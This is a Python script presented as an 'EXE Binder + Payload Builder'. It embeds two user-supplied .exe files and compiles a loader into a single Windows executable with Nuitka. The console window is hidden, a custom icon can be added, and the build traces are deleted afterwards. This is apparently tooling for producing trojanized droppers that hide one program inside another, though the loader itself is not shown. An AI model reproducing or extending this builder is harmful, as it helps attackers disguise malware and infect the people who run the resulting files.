import os
import subprocess
import sys
import shutil


def gen_embed(file, file2):
    file = file.strip('"')
    file2 = file2.strip('"')

    if not os.path.isfile(file):
        print(f"[!] Error: File not found -> {file}")
        return False

    if not os.path.isfile(file2):
        print(f"[!] Error: File not found -> {file2}")
        return False

    python_cmd = 'python3' if sys.platform != 'win32' else 'python'

    try:
        print("[*] Generating embedded data...")
        result = subprocess.run(
            [python_cmd, 'embed_files.py', file, file2],
            capture_output=True,
            text=True
        )
        print(result.stdout)
        if result.stderr:
            print("[!] Error:", result.stderr)
        return True
    except Exception as e:
        print("[!] Failed to run embed_files.py:", str(e))
        return False

def build_payload(payload='loader.py', output='output.exe', icon=False, icon_path=None, output_directory='Output'):
    if not os.path.isfile(payload):
        print(f"[!] Error: Payload not found -> {payload}")
        return

    if icon and (not icon_path or not os.path.isfile(icon_path)):
        print("[!] Error: Icon path is invalid or not found.")
        return
    
    os.makedirs(output_directory, exist_ok=True)
    cmd = [
        sys.executable, '-m', 'nuitka',
        '--onefile',
        '--windows-console-mode=disable',
        f'--output-filename={output}',
    ]

    if icon:
        cmd.append(f'--windows-icon-from-ico={icon_path}')

    cmd.append(payload)

    try:
        print("[*] Building payload using Nuitka...")
        subprocess.run(cmd, check=True)
        output_path = os.path.join(output_directory, output)
        if os.path.exists(output_path):
            os.remove(output_path)

        os.rename(output, output_path)
        name_only = os.path.splitext(payload)[0]
        clear(name_only)
        print(f"[+] Build complete: {output}")
    except subprocess.CalledProcessError as e:
        print("[!] Error during build:", e)

def clear(name):
    if os.path.exists('.gitignore'):
        os.remove('.gitignore')
    for suffix in ['.build', '.dist', '.onefile-build']:
        folder = f'{name}{suffix}'
        if os.path.exists(folder):
            shutil.rmtree(folder)


def main():
    print("="*50)
    print("        EXE Binder + Payload Builder")
    print("                 by Dexedus Eq.")
    print("="*50)

    file1 = input("\n[>] Drag the FIRST .exe file here: ").strip('"')
    file2 = input("[>] Drag the SECOND .exe file here: ").strip('"')

    icon = False
    icon_path = None

    choice = input("\n[?] Do you want to add an icon? (y/n): ").strip().lower()
    if choice == 'y':
        icon_path = input("[>] Drag the .ico file here: ").strip('"')
        icon = True

    if gen_embed(file1, file2):
        print("\n[*] Proceeding to build EXE...")
        build_payload(icon=icon, icon_path=icon_path)

if __name__ == '__main__':
    main()

